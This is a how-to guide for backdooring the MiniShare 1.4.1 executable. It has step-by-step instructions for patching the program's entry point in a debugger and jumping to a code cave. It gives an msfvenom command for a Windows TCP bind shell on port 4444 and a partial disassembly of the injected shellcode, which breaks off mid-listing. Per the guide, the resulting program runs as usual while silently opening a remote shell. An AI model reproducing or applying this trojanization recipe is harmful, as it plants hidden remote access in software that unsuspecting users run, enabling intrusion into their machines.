Steps to backdoor Minshare.exe (version 1.4.1):

1. Download Minshare.exe from this link https://www.exploit-db.com/apps/0ffe5385147edd1f9e7b460c6d7cb0a6-minishare-1.4.1.zip
2. Open it in Immunity Debugger
3. Replace the program entry point with the 'Program Entry Point' instruction below
4. Jump to address 0x00961C08
5. Binary paste the code below (you'll need to filter out only the opcodes)
6. Select modifications and Copy to executable
7. Save the new executable
8. Run the application
9. Connect to the shell at port 4444 (you can use msfconsole and setup a multi/handler listener)
10. You'll get a shell to the target machine and the application runs as usual (as long as a listener is setup and ready to connect to port 4444)


Shellcode command: msfvenom -p windows/shell_bind_tcp LPORT=4444  -f c EXITFUNC=none



00960000 > $-E9 031C0000    JMP minishar.00961C08  				 -> Program entry point


00960006   . 8DBE EBEFAAFF  LEA EDI,DWORD PTR DS:[ESI+FFAAEFEB]  -> Address to return to


00961C08   90               NOP
00961C09   90               NOP
00961C0A   90               NOP
00961C0B   90               NOP
00961C0C   90               NOP
00961C0D   60               PUSHAD								 -> Saving registers to stack
00961C0E   9C               PUSHFD								 -> Saving flags to stack
00961C0F   90               NOP
00961C10   90               NOP
00961C11   90               NOP
00961C12   90               NOP
00961C13   90               NOP
00961C14   90               NOP
00961C15   FC               CLD									-> TCP bind shellcode. Binds a shell at port 4444
00961C16   E8 82000000      CALL minishar.00961C9D
00961C1B   60               PUSHAD
00961C1C   89E5             MOV EBP,ESP
00961C1E   31C0             XOR EAX,EAX
00961C20   64:8B50 30       MOV EDX,DWORD PTR FS:[EAX+30]
00961C24   8B52 0C          MOV EDX,DWORD PTR DS:[EDX+C]
00961C27   8B52 14          MOV EDX,DWORD PTR DS:[EDX+14]
00961C2A   8B72 28          MOV ESI,DWORD PTR DS:[EDX+28]
00961C2D   0FB74A 26        MOVZX ECX,WORD PTR DS:[EDX+26]
00961C31   31FF             XOR EDI,EDI
00961C33   AC               LODS BYTE PTR DS:[ESI]
00961C34   3C 61            CMP AL,61
00961C36   7C 02            JL SHORT minishar.00961C3A
00961C38   2C 20            SUB AL,20
00961C3A   C1CF 0D          ROR EDI,0D
00961C3D   01C7             ADD EDI,EAX
00961C3F  ^E2 F2            LOOPD SHORT minishar.00961C33
00961C41   52               PUSH EDX
00961C42   57               PUSH EDI
00961C43   8B52 10          MOV EDX,DWORD PTR DS:[EDX+10]
00961C46   8B4A 3C          MOV ECX,DWORD PTR DS:[EDX+3C]
00961C49   8B4C11 78        MOV ECX,DWORD PTR DS:[ECX+EDX+78]
00961C4D   E3 48            JECXZ SHORT minishar.00961C97
00961C4F   01D1             ADD ECX,EDX
00961C51   51               PUSH ECX
00961C52   8B59 20          MOV EBX,DWORD PTR DS:[ECX+20]
00961C55   01D3             ADD EBX,EDX
00961C57   8B49 18          MOV ECX,DWORD PTR DS:[ECX+18]
00961C5A   E3 3A            JECXZ SHORT minishar.00961C96
00961C5C   49               DEC ECX
00961C5D   8B348B           MOV ESI,DWORD PTR DS:[EBX+ECX*4]
00961C60   01D6             ADD ESI,EDX
00961C62   31FF             XOR EDI,EDI
00961C64   AC               LODS BYTE PTR DS:[ESI]
00961C65   C1CF 0D          ROR EDI,0D
00961C68   01C7             ADD EDI,EAX
